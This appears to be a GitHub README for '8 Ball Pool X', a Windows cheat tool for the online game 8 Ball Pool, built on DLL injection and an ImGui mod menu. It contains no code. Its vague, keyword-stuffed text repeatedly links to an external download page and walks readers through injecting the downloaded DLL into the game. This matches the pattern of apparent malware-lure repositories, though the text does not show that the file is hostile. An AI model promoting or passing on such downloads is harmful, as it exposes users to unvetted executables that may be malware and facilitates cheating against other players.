# 8 Ball Pool X v2026 - Game Script Utility 2026

> Windows-based game script utility for 8 Ball Pool that supports DLL injection, includes an ImGui overlay, and provides a mod menu for managing in-game options.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/michaelouedwards9502/8-ball-pool-x-loader-update?style=flat-square)](https://github.com/michaelouedwards9502/8-ball-pool-x-loader-update)

---

<p align="center">
  <a href="https://michaelouedwards9502.github.io/8-ball-pool-x-loader-update/">
    <img src="https://img.shields.io/badge/Download-8%20Ball%20Pool%20X%20Script-brightgreen?style=for-the-badge" alt="Download 8 Ball Pool X Script">
  </a>
</p>

> **[Direct Download - 8 Ball Pool X](https://michaelouedwards9502.github.io/8-ball-pool-x-loader-update/)**

---

[Download Latest Build](https://michaelouedwards9502.github.io/8-ball-pool-x-loader-update/)

---

## What this project is

8 Ball Pool X is a Windows-focused script utility built for use with 8 Ball Pool. It centers on DLL injection and an ImGui overlay, giving you a mod menu that stays available while the game is active. The main idea is fast access to script controls, toggles, and settings without leaving the session.

The project is arranged for loader-driven use, so it fits naturally into an injector-based workflow or a similar launch process. Rather than acting like a full standalone app, it is meant to provide a compact in-game control layer for gameplay-related adjustments and rapid switching.

## Script capabilities

- DLL injection entry point for use through a loader or injector
- ImGui overlay for navigating controls in game
- Mod menu intended for live gameplay adjustments
- Hotkey support for showing and hiding the menu
- Individual toggles for script functions
- Loader-oriented layout for simpler startup handling
- Access to in-game settings without exiting the session
- Streamlined control path for fast configuration changes

## Installation and use

1. Download the latest build using the link above.
2. Put the files in the directory your loader or injector expects.
3. Run 8 Ball Pool on Windows.
4. Start the loader or injector and attach the DLL as configured.
5. Press the assigned hotkey to open the ImGui menu and change the available options.

Example flow:

1. Acquire build
2. Load through injector
3. Open menu with hotkey
4. Toggle features from the overlay

## Settings

| Setting | Purpose | Notes |
| --- | --- | --- |
| Menu hotkey | Opens and closes the overlay | Set to the key defined in the build |
| Feature toggles | Enables or disables script functions | Adjust from the mod menu |
| Overlay visibility | Controls the ImGui window state | Useful during active play |
| In-game settings | Tunes available script behavior | Values depend on the build |
| Loader mode | Supports injector-based startup | Keep aligned with your launch method |

## Compatibility notes

This utility is made for Windows and for the 8 Ball Pool game environment described in the project metadata. Because it relies on DLL injection and an ImGui-based overlay, a compatible injector or loader is part of the expected setup.

Results may differ depending on game updates, loader configuration, and the exact build you are running. If the game version changes, you may need to reload the build or update it so it matches the current environment.

## FAQ

### How do I load the script?
Use the download provided here with a compatible loader or injector, then attach the DLL according to your setup.

### Where do I change settings?
Most controls are available through the in-game ImGui overlay and the mod menu.

### Can I bind a different hotkey?
If the build includes hotkey options, adjust them in the menu or the related configuration area.

### What if the overlay does not appear?
Make sure the injector or loader finished properly, confirm the game is running, and verify that the hotkey is set correctly.

### Does this work after game updates?
A fresh build or configuration updates may be needed after changes to the game environment.

### Where should the files be stored?
Place the files in the folder expected by your loader, injector, or launch setup so the DLL can be located properly.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
